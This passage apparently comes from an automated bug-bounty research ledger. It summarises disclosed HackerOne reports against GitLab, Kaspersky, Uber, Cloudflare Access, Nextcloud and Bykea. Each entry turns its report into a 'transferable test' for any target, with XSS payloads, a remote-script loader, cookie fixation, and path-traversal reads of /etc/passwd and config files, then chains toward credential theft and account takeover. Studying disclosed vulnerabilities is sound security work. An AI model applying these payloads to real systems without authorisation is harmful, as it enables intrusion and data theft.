  4. THE SECRET-GROUP CASE, verbatim: "A Graphql query on a secret group / subgroup can bring to disclose the description of the group" / "No access from GUI: https://gitlab.com/secret-group-213" / the same `namespace(fullPath:"secret-group-213")` query with NO token -> `{"data":{"namespace":{"description":"This description is secret!","requestAccessEnabled":false,"fullName":"secret group","fullPath":"secret-group-213","id":"gid://gitlab/Group/5337756","lfsEnabled":true,"name":"secret group","path":"secret-group-213","visibility":"private","projects":{"edges":[]}}}}`
  5. THE IMPACT AS STATED, verbatim: "This Graphql query makes the `private profile` feature quite useless, and leaks the description and some other information about private groups and subgroups." / "An attacker can bypass the \"private profile\" check, and can access metadata about secret groups"
  6. THE REPORTER'S OWN LIMIT, verbatim: "The impact is limited because the GraphQL implementation is still at the beginning, I think that the impact of this issue would be bigger, if the GraphQL implementation was au-pair with the APIs implementation"
DETECTION SIGNAL: a GraphQL endpoint (`/api/graphql`, `/graphql`) whose fields return an object the REST API/GUI hides for the same subject — the test is a DIFFERENTIAL: pick a private/hidden object, call the REST route (expect 404/403/empty) and the GraphQL field (expect 200 with data); a GraphQL query that needs NO token where the REST route needs one; a field named `namespace`/`group`/`project`/`user`/`team`/`organization` that takes a `fullPath`/`path`/`slug` argument; a response that carries `visibility: "private"` for an object the caller cannot see in the GUI. TELL: the GraphQL schema is a PARALLEL authorization surface — the REST route's ACL is not automatically inherited by the GraphQL field.
CHAIN: an unauthenticated caller (no token) queries the GraphQL `namespace(fullPath:)` field for a private user profile or a secret group (primitive: a public GraphQL endpoint with a path-keyed field) -> the field returns the description, visibility, gid and project list with no authorization check (escalation: the "private profile" / secret-group boundary is bypassed — the caller learns the object EXISTS, its internal id, its visibility and its description) -> the attacker enumerates `fullPath` values (org names, team names, acquisition/product names, known usernames) and harvests the metadata of every private namespace (escalation: an internal namespace map — secret project/group names, descriptions, gids — useful for targeting and for the next IDOR/BOLA test) -> (documented lead, NOT demonstrated: namespace metadata -> namespace CONTENT; the report only shows metadata, and the reporter himself calls the impact limited). Per doctrine §8: preconditions = network reach to the GraphQL endpoint and no account/token (PR:N per the CVSS vector); gain = the description/visibility/id/project-metadata of private namespaces. HONESTY: the report demonstrates the metadata leak; the escalation to content is a lead, not a shown exploit; this is a P3-class limited cross-user data read, not a P1/P2.
TRANSFERABLE TEST: on ANY target with a GraphQL endpoint — (1) find a private/hidden object you cannot see in the GUI or via the REST API (a private repo/group/profile, a disabled feature, another user's namespace) and confirm the REST route returns 404/403/empty for it; (2) send the equivalent GraphQL field with the object's path/id and NO token — `curl 'https://<target>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"<path>\"){description visibility id name projects(includeSubgroups:true){edges{node{id name visibility description}}}}}'}`; (3) a 200 whose `data.namespace` is non-null (especially with `visibility:"private"`) is the authorization bypass; (4) enumerate candidate `fullPath` values (the org's known slugs, employee usernames, product names) and record which return data; (5) then CHAIN, never stop here: use the leaked `id` (the `gid://…` global id) to query the GraphQL `node(id:)` interface and every sibling field (`project`, `group`, `member`, `issue`, `mergeRequest`) — a GraphQL global id often doubles as the REST id, so test it against the REST API too; Rule: **a GraphQL field that returns an object the REST API hides for the same subject is an authorization bypass — query `namespace(fullPath:)` (or the equivalent path-keyed field) with no token, and a non-null `visibility:"private"` response is the PoC.**
DEDUPE: 0 hits across all three write targets for `614355`, `rpadovani`, `fullPath`, `api/graphql`, `secret-group`, `namespace(fullPath`. The `namespace(` hits in the ledger are the recorded UPSERVE `YUI.namespace('Env.DATA')` script-context XSS entry (a different product and a different sink). Pre-existing GraphQL material REVIEWED as related-but-distinct: the GitLab sort-parameter SQLi (#298176 -> §17.263 — a SQL injection in an ORM ORDER BY, not an authorization bypass) and the generic GraphQL recon rows (`/graphql`, `/api/graphql`, introspection, IDOR via aliasing, batching DoS, auth bypass), which are reconnaissance checklists, not a recorded field-vs-REST authorization desync. NONE records a GraphQL field whose authorization is weaker than the equivalent REST route for a PRIVATE namespace. New general method -> §17.386.
SOURCE: https://hackerone.com/reports/430854 + credited writeup https://palant.info/2018/11/30/maximizing-password-manager-attack-surface-leaning-from-kaspersky/  2026-11-10
ROUTE: `web_extract` on the HackerOne report page -> HTTP 200, the full report body (summary, description, environment, impact, the vendor's fix note and the advisory link). The report body carries no step-by-step PoC, so the CREDITED WRITEUP was also read in full this pass (`web_extract` -> HTTP 200, the complete article). Route that worked: `web_extract` on both the report page and the credited writeup.
STATUS: UNVERIFIED (not reproduced — no Kaspersky Password Manager install was driven this pass; every step and quote below is verbatim from the report body / the credited writeup).
CLASS: client-side security misconfiguration / sensitive info disclosure with PoC — A BROWSER-EXTENSION CONTENT SCRIPT THAT USES DOM EVENTS AS ITS OWN IPC (INSTEAD OF DIRECT CALLS) LEAVES ITS COMMUNICATION CHANNEL OPEN TO THE HOST PAGE, so any website can dispatch those events and make calls into the extension's NATIVE-MESSAGING EXECUTABLE; and the extension's injected autofill UI can be instrumented by the page to read stored addresses (CWE-348 / CWE-693 / CWE-200; Kaspersky weakness "Information Disclosure", severity Medium 4~6.9, reporter `palant`, submitted 2018-10-30, disclosed 2019-11-24, asset Kaspersky, bounty yes).
CORE METHOD:
  1. THE REPORT, verbatim: "It is possible for websites to read out addresses that the user stores in Kaspersky Password Manager." / "Kaspersky Password Manager injects its user interface into untrusted web pages, there are no protections in place. This makes it easy for websites to instrument the user interface, e.g. to fill in addresses without the user's consent or knowledge." / Impact, verbatim: "This allows to deanonymize and to track users, the address being a particularly valuable piece of information. Privacy conscious users will still be recognized reliably, even if clearing cookies and using proxy servers."
  2. THE ARCHITECTURE (credited writeup), verbatim: "Browser extensions have that escape hatch called native messaging which allows connecting to an executable running on the user's system. And that executable is what contains most of the logic in case of the Kaspersky Password Manager, with the browser extension being merely a dumb shell." / "No stupid sandboxing, code is running with the privileges of the logged in user. No memory safety, dealing with buffer overflows is up to the developers."
  3. THE IPC DEFECT, verbatim: "The extension uses website events to communicate with itself. As in: code running in the same scope (content script) uses events instead of direct calls. While seemingly pointless, this approach has a crucial advantage: it allows websites to mess with the communication and essentially make calls into the password manager's executable."
  4. THE NATIVE ATTACK SURFACE, verbatim: "I managed to identify large chunks of custom-written code that can be triggered by websites more or less directly: JSON parser, HTML parser, Neuronal network." / "the browser extension serializes the page back to HTML (with some additional attributes, e.g. to point out whether a particular field is visible) and sends it to the executable. The executable parses it, makes the neuronal network analyze the result and tells the extension which fields need to be filled with what values."
  5. THE PARSER DIFFERENTIAL, verbatim: "it doesn't know XML processing instructions and will treat them like regular tags. And `document.createProcessingInstruction("foo", "><script/src=x>")` is serialized as `<?foo ><script/src=x>?>`, so now the HTML parser will be processing HTML code that is no longer well-formed."
DETECTION SIGNAL: a browser extension / password manager / banking plugin / AV component whose content script communicates with ITSELF via DOM events (`addEventListener`/`dispatchEvent`/`CustomEvent`) instead of direct function calls; a content script that SERIALIZES THE PAGE (`document.documentElement.outerHTML` plus extra attributes) and ships it to a native executable; a `nativeMessaging` permission in the manifest with a named native host; an extension that injects its autofill/address UI into arbitrary pages with no origin allow-list. TELL: the extension's IPC is a DOM-event bus that the host page shares — the page can dispatch the same events the content script listens for.
CHAIN: any website the victim visits (primitive: the host page shares the content script's scope) -> the page dispatches the extension's own IPC events / calls the content script's exposed functions (primitive: the IPC channel is not origin-gated) -> the extension forwards the call to its NATIVE executable over native messaging (escalation: the webpage now drives native code running with the logged-in user's privileges, no sandbox) -> the attacker controls the page markup that the executable re-parses with its own HTML parser (primitive: a custom parser fed attacker-controlled serialized markup) -> `document.createProcessingInstruction("foo", "><script/src=x>")` serializes to `<?foo ><script/src=x>?>` and the custom parser treats the processing instruction as a regular tag, so the markup is no longer well-formed (escalation: parser differential / injection into the native parser) -> separate, simpler leg: the page instruments the injected autofill UI and reads the victim's stored ADDRESSES (impact: deanonymization/tracking — the address is a stable high-value identifier that survives cookie clearing and proxies; Medium). Per doctrine §8: preconditions = the victim has the extension installed and visits an attacker page (no privileges); gain = read stored addresses, plus a native-parser injection primitive that can escalate toward code execution in the user's context.
TRANSFERABLE TEST: for EVERY browser extension / password manager / banking plugin / AV / web-filter component in scope — (1) load a test page with the extension installed and enumerate the content script's event listeners (DevTools `getEventListeners`, or grep the content-script bundle for `addEventListener`/`onmessage`/`CustomEvent`); (2) dispatch the extension's own IPC events from the page (`document.dispatchEvent(new CustomEvent(...))`) and watch whether the extension reacts (a native-messaging call, a UI change, a network request) — a reaction means the page can drive the extension; (3) check the manifest for `nativeMessaging` and identify the native host executable; (4) feed the extension attacker-controlled page markup (a form containing `document.createProcessingInstruction("foo", "><script/src=x>")`, odd attributes, malformed HTML) and observe whether the native executable's parser is reached (a crash, a beacon, or a wrong autofill decision is the signal); (5) instrument the injected autofill/address UI: trigger autofill on a form and read the filled values from the DOM — a page that can read the filled address proves the disclosure. Rule: **an extension whose content script uses DOM events as its IPC and serializes the page to a native executable leaves that channel open to every website it runs on — dispatch the extension's own events from the page, and feed the native parser malformed markup via `createProcessingInstruction`.**
DEDUPE: 0 hits across all three write targets for `430854`, `nativeMessaging`, `native messaging`, `content script` (as an IPC channel), `createProcessingInstruction`, `serialized page` / `outerHTML` (as a native-parser feed). Pre-existing Kaspersky material REVIEWED as related-but-distinct: §17.369 (#469372 — predictable interstitial override links) and §17.371 (#463915 — the URL-Advisor widget served first-party and filled by an unvalidated `postMessage`) are DIFFERENT sinks (a predictable link counter; a `postMessage` origin check), not a DOM-event IPC bus into a native executable. Pre-existing `CustomEvent` material is a Google-Analytics `postMessage` listener that dispatches an event (the reverse direction), and the `outerHTML`/serialization hits are markdown/rich-text renderers, not an extension feeding a native parser. NONE records a content script whose own event bus is dispatchable by the host page and that serializes the page into a native executable's custom HTML parser. New general method -> §17.387.

SOURCE: https://hackerone.com/reports/145278  2026-11-10
ROUTE: `web_extract` on the HackerOne report page -> HTTP 200, the full report body (the PoC URL, the reproduction steps, the reporter's comment listing the affected subdomains, and Uber's bounty note). Route that worked: `web_extract` on the report page.
STATUS: UNVERIFIED (not reproduced — no Uber property was touched this pass; the PoC URL, payload and affected-subdomain list below are verbatim from the report body).
CLASS: XSS with real impact — A FIRST-PARTY QUERY PARAMETER (`kxsrc`) WHOSE VALUE IS A URL IS PASSED THROUGH TO A THIRD-PARTY JSONP/BEACON ENDPOINT, and the third party's `callback` parameter is reflected as executable JavaScript (HackerOne weakness "Cross-site Scripting (XSS) - Generic", severity "No rating", reporter `netfuzzer`, submitted 2016-06-17, disclosed 2016-07-25, asset www.uber.com, bounty yes).
CORE METHOD:
  1. THE POC, verbatim: `https://www.uber.com/?kxsrc=https%3A//beacon.krxd.net/optout_check%3Fcallback%3Dalert%28/XSSED/.source%29` — the first-party `kxsrc` parameter is set to `https://beacon.krxd.net/optout_check?callback=alert(/XSSED/.source)`.
  2. THE STEPS, verbatim: "1.visit [the URL] 2. wait until the page finishes loading 3.see the xss alert."
  3. THE SCOPE, verbatim (reporter's comment): "This same vulnerability affected multiple uber's subdomains, which some of them were: 1 - https://partners.uber.com/ 2 - getrush.uber.com 3 - https://rush.uber.com/ 4 - people.uber.com 5 - get.uber.com 6 - https://help.uber.com/" — and Uber's own note: "Based on this affecting partners.uber.com, getrush.uber.com, rush.uber.com, people.uber.com, get.uber.com, help.uber.com, and www.uber.com, this has a higher impact and we awarded it as such."
  4. THE MECHANISM AS DOCUMENTED: the report body does NOT explain the sink — it gives only the parameter name (`kxsrc`), the third-party endpoint (`beacon.krxd.net/optout_check`), the reflected `callback` parameter and the observable alert. HONESTY: the report does not state whether the payload executes in the first-party origin or the third-party origin; the transferable test below is built from the documented parameter/endpoint/payload shape.
DETECTION SIGNAL: a first-party query parameter whose value is a URL or a script source and whose name suggests a third-party script/beacon/source (`kxsrc`, `src`, `u`, `url`, `beacon`, `cdn`, `partner`, `px`, `geo`, `cb`, `callback`); a page that builds a third-party analytics/tag/beacon script URL from a first-party parameter; a third-party endpoint that reflects a `callback`/`cb`/`jsonp` parameter into executable JS (a JSONP endpoint). TELL: the first-party parameter is a pass-through to a third-party script URL — the attacker only needs a third-party JSONP endpoint that reflects `callback`.
CHAIN: an attacker who can lure a victim to a first-party URL (primitive: a reflected/pass-through query parameter) -> sets the parameter to a third-party JSONP endpoint with `callback=<payload>` (primitive: a third-party endpoint that reflects the callback into executable JS) -> the first-party page loads/executes that URL (escalation: the payload runs in the victim's browser on a first-party Uber property) -> session/PII theft on a logged-in Uber session (impact: XSS with real impact; Uber paid a bounty and cited the multi-subdomain spread as the impact multiplier). Per doctrine §8: preconditions = the victim clicks a crafted first-party link (UI:R) and the third-party JSONP endpoint reflects `callback`; gain = script execution in the victim's Uber session.
TRANSFERABLE TEST: on ANY target — (1) enumerate first-party parameters whose values are URLs or script sources (`kxsrc`, `src`, `u`, `url`, `beacon`, `cdn`, `partner`, `px`, `geo`, `cb`, `callback`) from the page's JS bundles and from `gau`/`waybackurls` output piped through `kxss`; (2) for each, set the parameter to a URL on a third-party JSONP endpoint (`https://<third-party>/endpoint?callback=alert(document.domain)//`) and load the page; (3) observe whether the payload executes (an alert, a beacon to your collector, or a `document.domain` readout); (4) if the parameter is server-side reflected into a `<script src>`, check whether the third-party endpoint's `callback` is reflected and whether the response `Content-Type` is JavaScript; (5) then CHAIN: if the payload runs in the first-party origin, use it to read the session/CSRF token and drive state-changing actions (the doctrine's XSS -> ATO chain). Rule: **a first-party parameter that is passed through to a third-party script/JSONP endpoint is an XSS sink — set it to `<third-party-endpoint>?callback=<payload>` and see whether the payload executes when the page loads.**
DEDUPE: 0 hits across all three write targets for `145278`, `kxsrc`, `krxd`, `optout_check`, `beacon.krxd.net`, `netfuzzer`. Pre-existing JSONP material REVIEWED as related-but-distinct: the ledger's `callback=setTimeout` entry is a CSP-BYPASS inline-script substitute on an ALLOWLISTED host (a different sink and purpose), and the generic `?callback=` rows are reconnaissance checklists, not a recorded first-party pass-through parameter that selects a third-party JSONP endpoint. NONE records a first-party parameter whose value is a third-party script/JSONP URL. New general method -> §17.388.

SOURCE: https://hackerone.com/reports/3423950 + credited writeup https://kazama.in/self-xss-to-cloudflare-single-click-approvals/  2026-11-10
ROUTE: `web_extract` on the HackerOne report page -> HTTP 200, the report metadata and the team/researcher summaries (the researcher summary credits the detailed writeup); the report body itself carries no step-by-step PoC, so the CREDITED WRITEUP was read in full this pass (`web_extract` -> HTTP 200, the complete article). Route that worked: `web_extract` on both the report page and the credited writeup.
STATUS: UNVERIFIED (not reproduced — no Cloudflare Access / Browser Isolation tenant was touched this pass; every step, payload and quote below is verbatim from the credited writeup).
CLASS: XSS with real impact / authentication bypass / ATO chain — THREE P4 PRIMITIVES CHAINED INTO A SINGLE-CLICK BYPASS OF CLOUDFLARE ACCESS'S TEMPORARY-AUTH APPROVAL: (1) an authenticated SELF-XSS, (2) COOKIE TOSSING of the CSRF cookie across `*.cloudflareaccess.com`, (3) a PREDICTABLE AntiCSRF token derived from that cookie (HackerOne weakness "Cross-site Scripting (XSS) - Stored", reporter `matured_kazama`, submitted 2025-11-12, disclosed 2026-04-14, asset Cloudflare Public Bug Bounty, bounty yes).
CORE METHOD:
  1. BUG 1 — SELF-XSS ON THE SAML SSO ENDPOINT, verbatim: "while registering the SAML app in Cloudflare's dashboard, the ACS URL field accepted non-HTTP protocols – a `javascript:` URI was happily saved without any validation. Second, when the SSO endpoint at `attackerdomain.cloudflareaccess.com/cdn-cgi/access/sso/saml` was hit, it rendered an auto-submitting POST form with this ACS URL as the form action. Since the `javascript:` URI went straight into the form's action attribute, the auto-submit triggered arbitrary JavaScript execution on the `*.cloudflareaccess.com` origin." / "It's an authenticated Self-XSS. The SAML SSO endpoint requires a valid `CF_Authorization` cookie."
  2. BUG 2 — COOKIE TOSSING, verbatim: "Cloudflare Access uses two cookies on `*.cloudflareaccess.com`: `CF_Authorization` handles authentication and authorization ... while `CF_Session` is used for CSRF prevention on sensitive actions like access request approvals. The `CF_Session` cookie is scoped to `*.cloudflareaccess.com`. Through Cookie Tossing – setting a cookie from a subdomain that propagates to all sibling subdomains – it's possible to fixate this cookie from `attackerdomain.cloudflareaccess.com` to `victimdomain.cloudflareaccess.com`. By setting `CF_Session=ZeroTrustIsFun!` (or any known value) from the attacker's subdomain, the cookie gets sent on every `*.cloudflareaccess.com/access-request/*` request, including the victim's approval endpoints."
  3. BUG 3 — PREDICTABLE ANTICSRF TOKEN, verbatim: "this token is fixed and static, derived directly from the `CF_Session` cookie value. When `CF_Session` is not present (which is default), it gets set to a random value on each page load, making the `csrf_token` unpredictable. However, if the cookie value is known, the CSRF token is known. It's entirely deterministic."
  4. THE CHAIN, verbatim: "1. Self-XSS provides JavaScript execution on `attackerdomain.cloudflareaccess.com` 2. Cookie Tossing from that origin fixates `CF_Session` across all `*.cloudflareaccess.com` subdomains, including the victim's 3. Predictable CSRF token from the fixated cookie allows a forged POST request to auto-approve the attacker's pending access request."
  5. THE SINGLE-CLICK DELIVERY, verbatim: "All of this happens in a single click. The victim sees nothing suspicious – just a page load – while their browser silently approves the attacker's access request." (delivered via an OTP magic link that sets `CF_Authorization`).
  6. THE POST-FIX COMEBACK — STORED SELF-XSS IN THE EMAIL FIELD, verbatim: "Some of these endpoints pull the user's email directly from the `CF_Authorization` cookie's JWT `email` claim – and render it without sanitization. The email was injected inside an inline `<script>` tag, something like: `<script> ... var userEmail = '<injection>'; ... </script>`" / payload, verbatim: `"test'</script><script>alert(document.domain)</script>"@burp-collab-domain.com` — "This passes email format validation (it's technically a valid email per RFC 5321), while the local part contains the full script breakout".
  7. THE LOWERCASE CONSTRAINT + STAGED PAYLOAD, verbatim: "Lowercase XSS is a solvable problem: Functions like `eval()`, `unescape()`, and `window.location.search` are entirely lowercase. A minimal bootstrap using these can load arbitrary mixed-case code from external sources." / "Splitting the payload across the email field, query string parameters, and a remote script made each stage simple while the combination was lethal."
DETECTION SIGNAL: a cookie whose `Domain` is a WILDCARD (`*.cloudflareaccess.com`, `.example.com`) and that is used for CSRF protection on a sensitive action; a CSRF token that is a deterministic function of a cookie value (test: change the cookie, reload, and see whether the token changes in step — if the token is `f(cookie)`, it is predictable); a SAML/OIDC ACS URL field that accepts a non-HTTP scheme (`javascript:`, `data:`); an auto-submitting form whose `action` is a stored URL; a JWT claim (e.g. `email`) rendered into an inline `<script>` string without escaping; an email validator that rejects malformed addresses but accepts an RFC 5321 quoted-string local part. TELL: a CSRF token that is derived from a cookie the attacker can FIXATE is not a CSRF defense.
CHAIN: an attacker with an account on their OWN `*.cloudflareaccess.com` tenant (primitive: a low-priv tenant) -> registers a SAML app whose ACS URL is `javascript:` (primitive: no scheme validation on a stored URL) -> the SSO endpoint auto-submits a form whose action is that URL -> JS executes on the attacker's own origin (primitive: authenticated self-XSS, alone worth nothing) -> the script sets `CF_Session=<known>` with `Domain=*.cloudflareaccess.com` (escalation: cookie tossing fixates the CSRF cookie on every sibling tenant) -> the CSRF token is `f(CF_Session)`, so the attacker now knows the victim's `csrf_token` (escalation: the CSRF defense is void) -> the victim is lured to a single-click OTP magic link that sets `CF_Authorization` and loads the attacker's page (escalation: the victim's authenticated session is now on the attacker's origin, so the self-XSS fires with the victim's privileges) -> the script silently POSTs the approval for the attacker's pending Temporary-Auth request (impact: the attacker is logged into the victim's application with valid cookies until they expire — unauthorized access / ATO; the post-fix variant re-opens the same chain through a stored self-XSS in the Browser Isolation email field). Per doctrine §8: preconditions = a Cloudflare Access tenant of your own + a victim approver who clicks a magic link (UI:R) + a wildcard-scoped CSRF cookie; gain = auto-approval of your access request and a valid session in the victim's application.
TRANSFERABLE TEST: on ANY target with a CSRF cookie + CSRF token on a sensitive action (approval, password change, payment, role grant) — (1) read the cookie's `Domain` (a wildcard `Domain` is the first signal) and the token; (2) change the cookie value, reload, and re-read the token — if the token is a deterministic function of the cookie (same cookie -> same token across sessions/tenants), the token is predictable; (3) from a subdomain you control on the same parent domain, set the CSRF cookie with `Domain=<parent>` (`document.cookie="csrf=<known>; domain=.example.com"`) and load the victim's approval page — if the page now sends YOUR cookie value and the token matches `f(your value)`, the fixation works; (4) find a self-XSS on your own tenant (a stored field rendered into an inline script — an email/display-name/status field is the classic) and test whether the payload survives the field's validator (an RFC 5321 quoted-string local part `"payload"@domain` passes most email validators); (5) if a filter blocks mixed-case or keywords, use a lowercase-only bootstrap (`eval`/`unescape`/`window.location.search`) and load the real payload from a remote script; (6) deliver with a single-click magic-link/OTP flow that sets the session cookie, and observe whether the approval POST fires silently. Rule: **a CSRF token derived from a wildcard-scoped cookie the attacker can fixate from a sibling subdomain is not a CSRF defense — set the cookie from your own subdomain, compute the token, and auto-approve the request from a self-XSS.**
DEDUPE: 0 hits across all three write targets for `3423950`, `3321406`, `cloudflareaccess`, `CF_Session`, `CF_Authorization`, `kazama`, `matured_kazama`, `quoted-string` (as an email local part), `RFC 5321` (as an email-validator bypass), `csrf_token` (as a deterministic function of a cookie). Pre-existing material REVIEWED as related-but-distinct: the ledger's `cookie tossing` hits are header-injection session fixation and double-submit CSRF preconditions (V-04/V-10), not a wildcard-cookie fixation used to make a CSRF token predictable; the `predictable token` hits are remember-me tokens and signed-cookie serializers, not a CSRF token derived from a fixated cookie; the generic V-09 "static or predictable CSRF tokens" checklist names the ingredients but records no chain. NONE records a CSRF token that is a deterministic function of a wildcard-scoped cookie the attacker can fixate from a sibling subdomain, chained with a self-XSS into a single-click auto-approval. New general method -> §17.389.

SOURCE: https://hackerone.com/reports/3249624 + vendor advisory https://github.com/nextcloud/security-advisories/security/advisories/GHSA-wpp5-4w35-pxq6 + fix commit https://github.com/nextcloud/tables/pull/1936/files  2026-11-10
ROUTE: the live `.json` route answered HTTP 200 but `visibility: no-content` (empty `vulnerability_information`, empty researcher summary) — the report BODY was never published. The browser tool on the report URL -> HackerOne "Sorry, something went wrong"; `r.jina.ai` -> backend timeout; the Wayback capture (20251017233923) -> a JS-disabled SPA shell. The method was therefore read this pass from the TWO primary sources the report itself points at: the vendor's GHSA advisory (impact statement) and the fix commit's diff (the exact vulnerable code and its fix). Route that worked: the vendor advisory + the fix commit (the report body is unavailable).
STATUS: UNVERIFIED (not reproduced — no Nextcloud instance was driven this pass; the advisory text, the code lines and the route table below are verbatim from the sources read).
CLASS: LFI / path traversal / internal file read — a TABLE-IMPORT endpoint takes a user-supplied file PATH and passes it to PhpSpreadsheet's `IOFactory::load()` after only a `file_exists()` check, with no `is_uploaded_file()` check, so an authenticated low-privilege user can point the importer at any file on the server that the library can parse and get its contents returned in the import preview (CWE-841 / Path Traversal; HackerOne weakness "Path Traversal", severity Medium 6.5, CVE-2025-58051, reporter `daroo`, submitted 2025-07-13 / disclosed 2025-10-16, asset Nextcloud, bounty yes).
CORE METHOD:
  1. THE ENDPOINTS (appinfo/routes.php, verbatim): `['name' => 'api1#importInTable', 'url' => '/api/1/import/table/{tableId}', 'verb' => 'POST']` and `['name' => 'api1#importInView', 'url' => '/api/1/import/views/{viewId}', 'verb' => 'POST']` (OCS form: `/ocs/v2.php/apps/tables/api/1/import/table/{tableId}`), plus the internal `/index.php/apps/tables/import/table/{tableId}` and `/import/view/{viewId}`.
  2. THE PARAMETER: `string $path` — documented in the controller as `@param string $path Path to file`; the controller signatures are `importInTable(int $tableId, string $path, bool $createMissingColumns = true)` and `importInView(int $viewId, string $path, bool $createMissingColumns = true)`. The only gate is `#[RequirePermission(permission: Application::PERMISSION_CREATE, type: Application::NODE_TYPE_TABLE, idParam: 'tableId')]` — i.e. any authenticated user who may create rows in a table.
  3. THE VULNERABLE CODE (fix diff, verbatim): in `lib/Service/ImportService.php`, both `previewImport()` and `import()` had
      `} elseif (\file_exists($path)) { $spreadsheet = IOFactory::load($path); ... }`
      and the fix changed it to
      `} elseif (is_uploaded_file($path) && file_exists($path)) { $spreadsheet = IOFactory::load($path); ... }`
      The added `is_uploaded_file()` is the whole fix: the old branch accepted ANY local path.
  4. THE IMPACT (vendor advisory, verbatim): "When importing a table, a user was able to specify files on the server and when their format is supported by the used PhpSpreadsheet library they would be included and their content leaked to the user." CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N.
  5. THE SECOND BRANCH (also present, verbatim): `if ($userFolder->nodeExists($path)) { $file = $userFolder->get($path); $tmpFileName = $file->getStorage()->getLocalFile($file->getInternalPath()); ... IOFactory::load($tmpFileName); }` — the same `$path` string is also resolved relative to the user's own folder, so a traversal-shaped `$path` is a second test surface.
DETECTION SIGNAL: an import / export / preview / "open file" endpoint whose parameter is named `path`, `file`, `filepath`, `filename` or `source` and whose value is a server-side path rather than an uploaded-file handle or an object id; a code path that calls a parser/loader (`IOFactory::load`, `fopen`, `file_get_contents`, `simplexml_load_file`, `PdfParser`, `Archive::open`) on that parameter; a guard that is `file_exists()` / `is_file()` / `is_readable()` but NOT `is_uploaded_file()`; a response that returns parsed cell/row/field values (a preview, a "parse result", a "dry run") rather than just a success flag. TELL: the parameter is a PATH the server resolves, not a handle the server handed you.
CHAIN: an authenticated low-priv user (primitive: a table they may create rows in) -> POSTs the import endpoint with `path` set to an absolute server path (e.g. `/var/www/nextcloud/config/config.php`, another user's file, `/etc/passwd`) -> the server's `file_exists()` passes and PhpSpreadsheet's `IOFactory::load()` parses the file and the preview/import returns its cell contents (escalation: arbitrary file read of every file whose format the library supports — the vendor's own wording) -> the attacker reads configuration, credentials and other tenants' spreadsheet-shaped files (impact: C:H internal file read / sensitive info disclosure; the reporter's own rating is Medium 6.5 because the file must be in a supported format). Per doctrine §8: preconditions = an authenticated account with row-create permission on any table; gain = the contents of any server file PhpSpreadsheet can parse.
TRANSFERABLE TEST: on ANY target with an import/upload/preview/parse endpoint — (1) capture the request and identify the parameter that names the file (`path`, `file`, `filepath`, `filename`, `source`, `url`); (2) replace its value with an absolute path to a file you know exists on the server (`/etc/passwd`, `/proc/self/environ`, the app's `config/config.php`, `.env`, a known uploaded file of another user) and send it; (3) if the response returns parsed rows/cells/fields or a preview of that file's contents, the path parameter is an LFI; (4) confirm the guard by testing a path that exists but is NOT an uploaded file — the missing `is_uploaded_file()` is the tell; (5) then CHAIN: read the app's config/secret files and use any credential found to reach a higher-privilege surface. Rule: **an import endpoint whose file argument is a server-side PATH guarded only by `file_exists()` is an LFI — point it at `/etc/passwd` or the app's own config and read the parsed result back.**
DEDUPE: 0 hits across all three write targets for `3249624`, `PhpSpreadsheet`, `is_uploaded_file`, `IOFactory`, `Nextcloud Tables`, `import/table`. Pre-existing import/LFI material REVIEWED as related-but-distinct: the ledger's import-family entries are a document-import pipeline that fetches a reference inside an uploaded archive (§17.93), a PDF/parser differential (§17.256), and an archive-extractor parser-selection bug (§17.226) — none is a user-supplied server PATH passed to a spreadsheet parser. New general method -> §17.390.

SOURCE: https://hackerone.com/reports/2868164  2026-11-10
ROUTE: the live `.json` route answered HTTP 200 with `visibility: no-content` (empty `vulnerability_information`, empty researcher summary); the full public text is the TEAM summary (by `pingsudo`, 2025-06-13), read verbatim this pass. `web_extract` on the report page -> HTTP 422 ("content could not be extracted"). Route that worked: the live HackerOne `.json` endpoint's `summaries` field.
STATUS: UNVERIFIED (not reproduced — no Bykea endpoint was touched this pass; the three endpoint names and the chain below are verbatim from the team summary).
CLASS: business logic with monetary/account impact — a Bronze-tier partner with a NEGATIVE wallet balance bypasses the platform's wallet restriction and accepts trips, by chaining three backend endpoints (HackerOne weakness "Business Logic Errors", severity Medium 6.5, reporter `bugbountywithmarco`, submitted 2025-06-13 / disclosed 2025-06-13, asset Bykea, bounty yes).
CORE METHOD (verbatim from the team summary):
  1. THE CHAIN, verbatim: "By chaining three backend endpoints `GET /v2/:city_id/bookings`, `PUT /api/v2/driver/update/location` (with any trip_id), and `POST /api/v2/offer/bid` a negative balance driver could reset their availability and successfully submit bids, enabling unauthorized access to trips despite wallet limitations."
  2. LINK 1 — ENUMERATE: `GET /v2/:city_id/bookings` returns the trips/bookings in a city (the target object set).
  3. LINK 2 — STATE RESET: `PUT /api/v2/driver/update/location` with ANY `trip_id` resets the driver's availability (the wallet/eligibility restriction is enforced against the driver's availability state, and the location-update endpoint clears it — the `trip_id` is not bound to a trip the driver is entitled to).
  4. LINK 3 — THE RESTRICTED ACTION: `POST /api/v2/offer/bid` submits a bid and the trip is accepted, despite the negative balance.
  5. THE IMPACT, verbatim: "enabling unauthorized access to trips despite wallet limitations."
DETECTION SIGNAL: a gig/ride-hailing/delivery platform with a wallet, balance, tier or eligibility restriction on accepting work; a "go online / update location / set availability / reset state" endpoint that accepts an ARBITRARY resource id (`trip_id`, `order_id`, `shift_id`) and is not bound to the caller's own session; a restriction that is evaluated against a MUTABLE state flag rather than re-checked at the moment of the privileged action. TELL: the restricted action (bid/accept) and the state that gates it are managed by DIFFERENT endpoints, and the state endpoint accepts an id it does not own.
CHAIN: a Bronze-tier driver with a negative wallet balance (primitive: a low-tier account under a monetary restriction) -> enumerates trips with `GET /v2/:city_id/bookings` (primitive: the target object set) -> `PUT /api/v2/driver/update/location` with any `trip_id` resets the driver's availability / clears the restriction state (escalation: the gate is a mutable flag, not a server-side invariant) -> `POST /api/v2/offer/bid` submits a bid and the trip is accepted (impact: unauthorized access to trips / monetary loss — the driver earns fares the platform's wallet policy is meant to block). Per doctrine §8: preconditions = a Bronze-tier partner account with a negative balance; gain = accept trips and bid despite the restriction.
